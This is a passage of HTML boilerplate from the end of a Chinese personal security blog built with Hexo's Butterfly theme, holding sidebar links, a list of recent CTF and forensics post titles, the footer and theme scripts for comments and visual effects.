fa-github"></i><span>关注捏</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xyaxxya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/3170234809@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://blog.csdn.net/xydsg" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="https://xyaxxya.github.io/2023/09/23/about-me/" target="_blank" title="wechat"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">慢慢来，比较快</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/01/27/HackMyVM%20Nessus/" title="HackMyVM Nessus"><img src="https://www.dmoe.cc/random.php?5756" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackMyVM Nessus"/></a><div class="content"><a class="title" href="/2025/01/27/HackMyVM%20Nessus/" title="HackMyVM Nessus">HackMyVM Nessus</a><time datetime="2025-01-27T02:11:15.000Z" title="发表于 2025-01-27 10:11:15">2025-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/26/2024%E9%95%BF%E5%9F%8E%E6%9D%AF&amp;CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-sc05/" title="2024长城杯&amp;CISCN-威胁流量分析-sc05"><img src="https://www.dmoe.cc/random.php?1958" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024长城杯&amp;CISCN-威胁流量分析-sc05"/></a><div class="content"><a class="title" href="/2025/01/26/2024%E9%95%BF%E5%9F%8E%E6%9D%AF&amp;CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-sc05/" title="2024长城杯&amp;CISCN-威胁流量分析-sc05">2024长城杯&amp;CISCN-威胁流量分析-sc05</a><time datetime="2025-01-26T02:40:34.000Z" title="发表于 2025-01-26 10:40:34">2025-01-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/23/HackMyVM%20buster/" title="HackMyVM buster"><img src="https://www.dmoe.cc/random.php?7067" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackMyVM buster"/></a><div class="content"><a class="title" href="/2025/01/23/HackMyVM%20buster/" title="HackMyVM buster">HackMyVM buster</a><time datetime="2025-01-23T07:07:38.000Z" title="发表于 2025-01-23 15:07:38">2025-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/22/2024%E6%95%B0%E8%AF%81%E6%9D%AF%E5%86%B3%E8%B5%9B%E5%9B%A2%E9%98%9F%E8%B5%9B/" title="2024数证杯决赛团队赛"><img src="https://www.dmoe.cc/random.php?5475" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024数证杯决赛团队赛"/></a><div class="content"><a class="title" href="/2025/01/22/2024%E6%95%B0%E8%AF%81%E6%9D%AF%E5%86%B3%E8%B5%9B%E5%9B%A2%E9%98%9F%E8%B5%9B/" title="2024数证杯决赛团队赛">2024数证杯决赛团队赛</a><time datetime="2025-01-22T03:59:00.000Z" title="发表于 2025-01-22 11:59:00">2025-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/21/2024%E9%95%BF%E5%9F%8E%E6%9D%AF&amp;CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-WinFT/" title="2024长城杯&amp;CISCN-威胁流量分析-WinFT"><img src="https://www.dmoe.cc/random.php?462" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024长城杯&amp;CISCN-威胁流量分析-WinFT"/></a><div class="content"><a class="title" href="/2025/01/21/2024%E9%95%BF%E5%9F%8E%E6%9D%AF&amp;CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-WinFT/" title="2024长城杯&amp;CISCN-威胁流量分析-WinFT">2024长城杯&amp;CISCN-威胁流量分析-WinFT</a><time datetime="2025-01-21T09:45:35.000Z" title="发表于 2025-01-21 17:45:35">2025-01-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By yiyi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎常来喵~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'pYgEIy3e8aneCT2SHN7sYl1L-gzGzoHsz',
      appKey: 'V8vEx9nsiDEMy45ekCcPUaiN',
      avatar: 'monsterid',
      serverURLs: 'https://pygeiy3e.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: true
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="❤️,🩷,🧡,💛,💚,💙,🩵,💜,🤎,🖤,🩶,🤍" data-fontsize="15px" data-random="random" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>